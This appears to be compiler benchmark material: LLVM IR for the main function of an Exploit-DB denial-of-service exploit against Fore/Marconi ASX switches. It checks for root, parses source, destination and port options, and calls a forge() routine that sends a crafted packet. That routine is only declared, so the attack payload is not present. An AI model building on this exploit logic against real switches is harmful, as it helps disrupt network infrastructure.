; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_20644.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/hardware/dos/extr_20644.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [57 x i8] c"\0ADenial of Service attack for Fore/Marconi ASX Switches\0A\00", align 1
@.str.1 = private unnamed_addr constant [94 x i8] c"Found by Keith Pachulski <keithp@corp.ptd.net>\0AExploit written by J.K. Garvey <jim@trig.org>\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"\0ARoot is required. Duh.\0A\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"s:d:p:\00", align 1
@optarg = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [23 x i8] c"\0ACrafted packet sent!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i16, align 2
  %9 = alloca i16, align 2
  %10 = alloca i32, align 4
  %11 = alloca [16 x i8], align 16
  %12 = alloca [16 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i16 0, i16* %8, align 2
  store i16 80, i16* %9, align 2
  %13 = call i32 @printf(i8* getelementptr inbounds ([57 x i8], [57 x i8]* @.str, i64 0, i64 0))
  %14 = call i32 @printf(i8* getelementptr inbounds ([94 x i8], [94 x i8]* @.str.1, i64 0, i64 0))
  %15 = call i64 (...) @getuid()
  %16 = icmp ne i64 %15, 0
  br i1 %16, label %17, label %20

17:                                               ; preds = %2
  %18 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %19 = call i32 @exit(i32 0) #3
  unreachable

20:                                               ; preds = %2
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 5
  br i1 %22, label %23, label %29

23:                                               ; preds = %20
  %24 = load i8**, i8*** %5, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 0
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @usage(i8* %26)
  %28 = call i32 @exit(i32 0) #3
  unreachable

29:                                               ; preds = %20
  br label %30

30:                                               ; preds = %52, %29
  %31 = load i32, i32* %4, align 4
  %32 = load i8**, i8*** %5, align 8
  %33 = call i32 @getopt(i32 %31, i8** %32, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.3, i64 0, i64 0))
  store i32 %33, i32* %10, align 4
  %34 = icmp ne i32 %33, -1
  br i1 %34, label %35, label %53

35:                                               ; preds = %30
  %36 = load i32, i32* %10, align 4
  switch i32 %36, label %52 [
    i32 115, label %37
    i32 100, label %43
    i32 112, label %49
  ]

37:                                               ; preds = %35
  %38 = load i32, i32* @optarg, align 4
  %39 = call i32 @host_convert(i32 %38)
  store i32 %39, i32* %6, align 4
  %40 = getelementptr inbounds [16 x i8], [16 x i8]* %12, i64 0, i64 0
  %41 = load i32, i32* @optarg, align 4
  %42 = call i32 @strncpy(i8* %40, i32 %41, i32 16)
  br label %52

43:                                               ; preds = %35
  %44 = load i32, i32* @optarg, align 4
  %45 = call i32 @host_convert(i32 %44)
  store i32 %45, i32* %7, align 4
  %46 = getelementptr inbounds [16 x i8], [16 x i8]* %11, i64 0, i64 0
  %47 = load i32, i32* @optarg, align 4
  %48 = call i32 @strncpy(i8* %46, i32 %47, i32 16)
  br label %52

49:                                               ; preds = %35
  %50 = load i32, i32* @optarg, align 4
  %51 = call zeroext i16 @atoi(i32 %50)
  store i16 %51, i16* %9, align 2
  br label %52

52:                                               ; preds = %35, %49, %43, %37
  br label %30

53:                                               ; preds = %30
  %54 = load i32, i32* %6, align 4
  %55 = load i32, i32* %7, align 4
  %56 = load i16, i16* %9, align 2
  %57 = call i32 @forge(i32 %54, i32 %55, i16 zeroext %56)
  %58 = call i32 @printf(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.4, i64 0, i64 0))
  %59 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i64 @getuid(...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i32 @host_convert(i32) #1

declare dso_local i32 @strncpy(i8*, i32, i32) #1

declare dso_local zeroext i16 @atoi(i32) #1

declare dso_local i32 @forge(i32, i32, i16 zeroext) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
